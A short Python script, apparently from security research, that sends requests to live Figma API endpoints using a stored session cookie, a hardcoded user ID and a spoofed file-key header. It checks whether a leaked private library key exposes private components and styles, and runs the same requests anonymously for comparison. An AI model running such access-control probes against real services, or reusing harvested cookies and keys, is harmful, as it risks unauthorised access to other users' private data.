"""Test whether a leaked subscribed-library file key unlocks private library content."""

import io
import json
import sys
import urllib.error
import urllib.request


sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://www.figma.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
B_UID = "1667396392129259941"
PUBLIC_CONSUMER = "bv2nMIdFf4u3dESGail4sm"
PRIVATE_LIBRARY = "cQBfbmMrjx4WNnpCt79xwM"


def load_cookie(name):
    with io.open(name, encoding="utf-8") as handle:
        return handle.read().strip()


def get(path, context_key, uid=None, cookie=None):
    headers = {
        "User-Agent": UA,
        "Accept": "application/json",
        "Referer": f"{BASE}/design/{PUBLIC_CONSUMER}/",
        "X-Figma-User-ID": uid or "",
        "X-Figma-File-Key": context_key,
    }
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(BASE + path, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(request, timeout=25) as response:
            return response.status, response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode(errors="replace")


def summarize(raw):
    try:
        value = json.loads(raw)
    except json.JSONDecodeError:
        return raw[:180]
    if not isinstance(value, dict):
        return f"json_type={type(value).__name__}"
    result = {"keys": sorted(value), "status": value.get("status")}
    for key in ("error", "message", "reason"):
        if key in value:
            result[key] = value[key]
    meta = value.get("meta")
    if isinstance(meta, dict):
        result["meta_keys"] = sorted(meta)
        for key, item in meta.items():
            if isinstance(item, list):
                result[f"{key}_count"] = len(item)
            elif isinstance(item, dict):
                result[f"{key}_count"] = len(item)
    return json.dumps(result, ensure_ascii=False)


cookie_b = load_cookie("ws_cookie_B_new.txt")
paths = (
    f"/api/files/{PRIVATE_LIBRARY}",
    f"/api/files/{PRIVATE_LIBRARY}/meta",
    f"/api/file_metadata/{PRIVATE_LIBRARY}",
    f"/api/design_systems/library/{PRIVATE_LIBRARY}/published_components",
    f"/api/design_systems/library/{PRIVATE_LIBRARY}/styles",
    f"/api/design_systems/library/{PRIVATE_LIBRARY}/subscribed_components",
    f"/api/design_systems/v2/library/{PRIVATE_LIBRARY}/published_components",
)
actors = (
    ("B", B_UID, cookie_b),
    ("anonymous", None, None),
)

for path in paths:
    print(f"\n== {path} ==")
    for context_label, context_key in (
        ("consumer-context", PUBLIC_CONSUMER),
        ("library-context", PRIVATE_LIBRARY),
    ):
        for actor_label, uid, cookie in actors:
            code, raw = get(path, context_key, uid, cookie)
            print(
                f"[{actor_label} / {context_label}] {code} {summarize(raw)}"
            )
